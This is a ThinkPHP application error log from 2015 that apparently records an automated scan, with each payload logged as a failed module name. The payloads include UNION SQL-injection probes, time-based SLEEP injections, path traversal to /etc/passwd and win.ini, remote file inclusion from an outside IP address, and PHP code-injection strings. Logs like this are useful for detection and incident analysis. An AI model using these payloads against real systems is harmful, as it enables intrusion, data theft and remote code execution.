[ 2015-09-30T05:00:21+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType([(,'),,[)
[ 2015-09-30T05:00:23+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:23+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:24+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T05:00:24+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:24+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:25+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:25+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T05:00:26+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T05:00:26+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:27+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:27+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:28+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:28+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T05:00:29+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T05:00:29+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T05:00:30+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:30+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:31+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:31+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:32+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:32+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T05:00:33+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T05:00:33+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T05:00:34+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T05:00:34+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:35+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:35+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:36+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:36+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:37+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:37+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T05:00:38+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T05:00:38+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T05:00:39+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T05:00:39+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T05:00:40+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:40+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:41+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:41+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:41+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:42+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:42+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:43+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T05:00:43+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T05:00:44+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T05:00:44+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T05:00:45+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T05:00:45+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T05:00:46+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:46+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:47+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:47+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:48+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:48+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:49+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:49+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:50+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T05:00:50+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T05:00:51+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T05:00:51+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T05:00:52+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T05:00:52+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T05:00:52+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T05:00:53+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:53+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:54+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:54+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:55+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:55+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:56+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:56+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:57+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:00:57+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T05:00:58+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T05:00:58+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T05:00:59+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T05:00:59+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T05:01:00+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T05:01:00+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T05:01:01+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T05:01:01+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:02+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:02+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:03+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:03+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:04+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:04+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:05+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:05+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:06+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:06+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T05:01:07+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T05:01:07+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T05:01:07+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T05:01:08+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T05:01:08+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T05:01:09+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T05:01:09+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T05:01:10+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T05:01:10+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:11+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:11+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:12+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:12+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:13+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:13+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:14+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:14+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:15+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:15+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T05:01:16+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType AND SLEEP(5)
[ 2015-09-30T05:01:16+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType AND SLEEP(5) #
[ 2015-09-30T05:01:17+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType; SELECT PG_SLEEP(5)--
[ 2015-09-30T05:01:17+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType; SELECT SLEEP(5)-- 
[ 2015-09-30T05:01:18+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType'; SELECT SLEEP(5)-- 
[ 2015-09-30T05:01:18+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType) AND SLEEP(5) #
[ 2015-09-30T05:01:19+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType'; SELECT SLEEP(5)--
[ 2015-09-30T05:01:19+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType WAITFOR DELAY '0:0:5'--
[ 2015-09-30T05:19:52+08:00 ] ERR: (ThinkException) 无法加载模块/etc/passwd
[ 2015-09-30T05:20:01+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd
[ 2015-09-30T05:20:08+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd .jpg
[ 2015-09-30T05:20:17+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../../../etc/passwd%00
[ 2015-09-30T05:20:24+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini
[ 2015-09-30T05:20:30+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini .jpg
[ 2015-09-30T05:20:37+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-30T05:20:41+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-30T05:20:46+08:00 ] ERR: (ThinkException) 无法加载模块a_long_name_file_not_exist
[ 2015-09-30T05:23:36+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}
[ 2015-09-30T05:26:29+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}\
[ 2015-09-30T15:47:14+08:00 ] ERR: (ThinkException) 无法加载模块/etc/passwd
[ 2015-09-30T15:47:20+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd
